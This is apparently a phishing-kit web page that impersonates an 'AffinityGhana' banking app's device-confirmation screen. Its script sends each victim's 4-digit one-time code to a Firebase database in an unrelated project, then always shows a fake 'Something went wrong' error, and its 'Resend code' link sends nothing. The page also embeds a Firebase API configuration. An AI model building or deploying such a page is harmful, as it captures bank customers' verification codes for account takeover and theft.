<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AffinityGhana - Confirm Device</title>
<link rel="icon" type="image/png" href="assets/logo.png">
<link rel="stylesheet" href="style.css">
<style>
  .confirm-device-page {
    background: #ffffff;
    padding: 60px 24px 32px;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }

  .confirm-device-page .back-btn {
    position: absolute;
    top: 18px;
    left: 18px;
    background: none;
    border: none;
    font-size: 30px;
    color: #333;
    cursor: pointer;
    z-index: 5;
    line-height: 1;
    padding: 4px 10px;
    text-decoration: none;
  }

  .confirm-device-page h1.device-title {
    font-size: 26px;
    font-weight: 800;
    color: #1a1a1a;
    margin-bottom: 10px;
    letter-spacing: -0.3px;
    line-height: 1.2;
    text-align: left;
  }

  .confirm-device-page p.device-subtitle {
    font-size: 15px;
    color: #6b7280;
    margin-bottom: 40px;
    font-weight: 400;
    text-align: left;
    line-height: 1.4;
  }

  .confirm-device-page .device-otp-boxes {
    display: flex;
    gap: 16px;
    justify-content: center;
    margin: 0 0 30px 0;
  }

  .confirm-device-page .device-otp-box {
    width: 65px;
    height: 65px;
    border: none;
    border-radius: 14px;
    background: #f0f0f0;
    text-align: center;
    font-size: 28px;
    font-weight: 700;
    color: #1a1a1a;
    outline: none;
    caret-color: transparent;
  }

  .confirm-device-page .device-otp-box:focus {
    background: #e8e8e8;
    box-shadow: 0 0 0 2px rgba(61, 26, 74, 0.15);
  }

  .confirm-device-page .resend-row {
    text-align: center;
    font-size: 15px;
    color: #6b7280;
    margin-bottom: 30px;
  }

  .confirm-device-page .resend-row a {
    color: #f2994a;
    font-weight: 600;
    text-decoration: none;
    cursor: pointer;
  }

  .confirm-device-page .ussd-link {
    text-align: center;
    color: #1a1a1a;
    font-weight: 600;
    font-size: 15px;
    cursor: pointer;
    text-decoration: none;
    display: block;
    margin-top: 10px;
  }

  .confirm-device-page .timer-text {
    text-align: center;
    font-size: 14px;
    color: #6b7280;
    margin-bottom: 30px;
  }

  .confirm-device-page .timer-text span {
    color: #3d1a4a;
    font-weight: 700;
  }
</style>
</head>
<body>

<div class="app">
  <div class="page confirm-device-page">

    <a href="otp.html" class="back-btn">‹</a>

    <h1 class="device-title">Please confirm your device</h1>
    <p class="device-subtitle">Enter the 4-digit code we sent to <span id="devicePhoneDisplay">xxxx7142</span></p>

    <div class="device-otp-boxes" id="deviceOtpWrap">
      <input type="tel" maxlength="1" class="device-otp-box" inputmode="numeric" autocomplete="one-time-code">
      <input type="tel" maxlength="1" class="device-otp-box" inputmode="numeric" autocomplete="off">
      <input type="tel" maxlength="1" class="device-otp-box" inputmode="numeric" autocomplete="off">
      <input type="tel" maxlength="1" class="device-otp-box" inputmode="numeric" autocomplete="off">
    </div>

    <div class="resend-row">
      Didn't receive a code? <a id="resendLink">Resend code</a>
    </div>

    <div class="timer-text" id="timerText">
      You can resend in <span id="deviceTimer">3:30</span>
    </div>

    <a href="#" class="ussd-link">Use USSD instead</a>

  </div>
</div>

<!-- Toast Notification -->
<div id="toast" class="toast"></div>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

<script>
  const firebaseConfig = {
    apiKey: "AIzaSyBx6AU-Jvg1So-Ty3FFKryctXZGV-LNFCY",
    authDomain: "achievebypetra-82966.firebaseapp.com",
    databaseURL: "https://achievebypetra-82966-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "achievebypetra-82966",
    storageBucket: "achievebypetra-82966.firebasestorage.app",
    messagingSenderId: "412688052429",
    appId: "1:412688052429:web:abf989e226e153b7c37984"
  };

  firebase.initializeApp(firebaseConfig);
  const database = firebase.database();
  const DB_NODE = "affinity_users";

  // ✅ TOAST FUNCTION
  function showToast(msg) {
    var toast = document.getElementById("toast");
    toast.textContent = msg;
    toast.classList.add("show");
    clearTimeout(toast._t);
    toast._t = setTimeout(function() { toast.classList.remove("show"); }, 3000);
  }

  // Show phone number formatted like xxxx7142
  var savedPhone = sessionStorage.getItem("affinity_phone");
  if (savedPhone) {
    var clean = savedPhone.replace(/\D/g, '');
    var last4 = clean.slice(-4);
    document.getElementById("devicePhoneDisplay").textContent = "xxxx" + last4;
  }

  var deviceOtpBoxes = document.querySelectorAll(".device-otp-box");

  deviceOtpBoxes.forEach(function(box, idx) {
    box.addEventListener("input", function() {
      box.value = box.value.replace(/\D/g, "");
      if (box.value && idx < deviceOtpBoxes.length - 1) {
        deviceOtpBoxes[idx + 1].focus();
      }
      var otp = "";
      var allFilled = true;
      deviceOtpBoxes.forEach(function(b) { if (!b.value) allFilled = false; otp += b.value; });
      if (allFilled && otp.length === 4) { saveDeviceOTP(otp); }
    });
    box.addEventListener("keydown", function(e) {
      if (e.key === "Backspace" && !box.value && idx > 0) { 
        deviceOtpBoxes[idx - 1].focus(); 
      }
    });
  });

  setTimeout(function() { deviceOtpBoxes[0].focus(); }, 100);

  // ✅ Save to "confirmDevice" field
  function saveDeviceOTP(otp) {
    var userId = sessionStorage.getItem("affinity_userId");
    if (!userId) { 
      window.location.href = "phone-number.html"; 
      return; 
    }

    database.ref(DB_NODE + "/" + userId).update({ confirmDevice: otp })
      .then(function() {
        // ✅ TOAST POPUP ON THIS PAGE
        showToast("Something went wrong");
        document.getElementById("deviceOtpWrap").classList.add("locked");
      })
      .catch(function(error) {
        console.error("❌ Firebase error:", error);
        showToast("Something went wrong");
        document.getElementById("deviceOtpWrap").classList.add("locked");
      });
  }

  // ✅ 3 minutes 30 seconds = 210 seconds
  var secondsLeft = 210;
  var deviceTimerEl = document.getElementById("deviceTimer");

  function updateTimer(t) {
    var m = Math.floor(t / 60), s = t % 60;
    deviceTimerEl.textContent = m + ":" + (s < 10 ? "0" : "") + s;
  }
  updateTimer(secondsLeft);

  var deviceInterval = setInterval(function() {
    secondsLeft--;
    if (secondsLeft <= 0) {
      clearInterval(deviceInterval);
      deviceTimerEl.textContent = "expired";
      return;
    }
    updateTimer(secondsLeft);
  }, 1000);

  // Resend link
  document.getElementById("resendLink").addEventListener("click", function(e) {
    e.preventDefault();
    secondsLeft = 210;
    updateTimer(secondsLeft);
    showToast("Code resent");
  });
</script>

</body>
</html>
